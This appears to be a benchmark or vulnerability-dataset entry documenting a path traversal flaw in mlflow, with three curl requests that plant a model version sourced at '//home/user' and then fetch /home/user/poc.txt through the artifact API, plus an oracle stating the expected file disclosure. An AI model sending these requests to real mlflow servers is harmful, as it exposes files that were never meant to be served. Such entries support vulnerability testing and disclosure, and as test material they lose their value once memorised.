title: Path traversal vulnerability due to improper URI scheme and hostname validation in mlflow/mlflow
trigger_payload:
curl -X POST -H 'Content-Type: application/json' -d '{"name": "poc"}' 'http://127.0.0.1:5000/models/create'
curl -X POST -H 'Content-Type: application/json' -d '{"name": "poc", "source": "//home/user"}' 'http://127.0.0.1:5000/model-versions/create'
curl 'http://127.0.0.1:5000/model-versions/get-artifact?path=poc.txt&name=poc&version=1'
oracle: The server reads and returns the contents of a file located at /home/user/poc.txt, which is not intended to be accessible via the API.
